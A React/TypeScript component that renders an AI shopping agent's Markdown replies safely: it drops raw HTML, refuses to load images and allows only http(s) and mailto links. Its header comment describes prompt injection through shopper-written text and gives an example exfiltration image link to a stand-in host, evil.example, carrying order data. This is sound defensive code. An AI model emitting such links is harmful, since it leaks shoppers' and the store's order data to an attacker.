import ReactMarkdown, { defaultUrlTransform, type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';

// The agent answers in Markdown (GitHub flavour: tables, lists, bold, code). The text is untrusted: the model
// writes it, and it can quote shopper-written product names or order notes. react-markdown turns it into React
// elements and never inserts raw HTML. On top of that:
//  - raw HTML inside the text is dropped (skipHtml), never rendered;
//  - images are never loaded. A Markdown image is a request to any URL as soon as it renders, which an injected
//    instruction could use to smuggle data out (![x](https://evil.example/?q=<order data>)). Its alt text is shown
//    instead. The dashboard's CSP (default-src 'self') would block the request too; this is the second layer;
//  - links keep only http(s) and mailto targets, open in a new tab without a referrer, and show their real target
//    on hover, so a link's text cannot hide where it goes.

const SAFE_LINK = /^(https?:|mailto:)/i;

/** Returns the URL if it is a link we allow, otherwise '' (the link renders as plain text). */
export function safeLinkUrl(url: string): string {
  const cleaned = defaultUrlTransform(url); // already blanks javascript:, data:, vbscript: and friends
  return SAFE_LINK.test(cleaned) ? cleaned : '';
}

const components: Components = {
  p: ({ children }) => <p className="my-2 first:mt-0 last:mb-0">{children}</p>,
  strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
  ul: ({ children }) => <ul className="my-2 list-disc space-y-1 pl-5">{children}</ul>,
  ol: ({ children }) => <ol className="my-2 list-decimal space-y-1 pl-5">{children}</ol>,
  h1: ({ children }) => <p className="my-2 font-semibold">{children}</p>,
  h2: ({ children }) => <p className="my-2 font-semibold">{children}</p>,
  h3: ({ children }) => <p className="my-2 font-semibold">{children}</p>,
  blockquote: ({ children }) => <blockquote className="my-2 border-l-2 border-line-strong pl-3 text-ink-2">{children}</blockquote>,
  hr: () => <hr className="my-3 border-line" />,
  code: ({ children }) => <code className="mono rounded bg-surface px-1 py-px text-[13.5px]">{children}</code>,
  pre: ({ children }) => (
    <pre className="my-2 overflow-x-auto rounded-md bg-surface px-3 py-2 text-[13px] leading-relaxed [&_code]:bg-transparent [&_code]:p-0">
      {children}
    </pre>
  ),
  // Wide tables scroll inside the bubble instead of stretching the page.
  table: ({ children }) => (
    <div className="my-2 overflow-x-auto rounded-md border border-line bg-surface">
      <table className="w-full border-collapse text-[14px]">{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead className="bg-sunken">{children}</thead>,
  th: ({ children, style }) => (
    <th style={style} className="border-b border-line-strong px-3 py-1.5 text-left font-semibold whitespace-nowrap">
      {children}
    </th>
  ),
  td: ({ children, style }) => (
    <td style={style} className="border-b border-line px-3 py-1.5 align-top tabular-nums">
      {children}
    </td>
  ),
  a: ({ href, children }) =>
    href ? (
      <a href={href} title={href} target="_blank" rel="noopener noreferrer nofollow" className="text-accent-strong underline underline-offset-2">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
  img: ({ alt }) => <span className="text-ink-3">[image{alt ? `: ${alt}` : ''} not shown]</span>,
};

/** The agent's reply text, rendered as safe Markdown. */
export function Markdown({ text }: { text: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} skipHtml urlTransform={safeLinkUrl}>
      {text}
    </ReactMarkdown>
  );
}
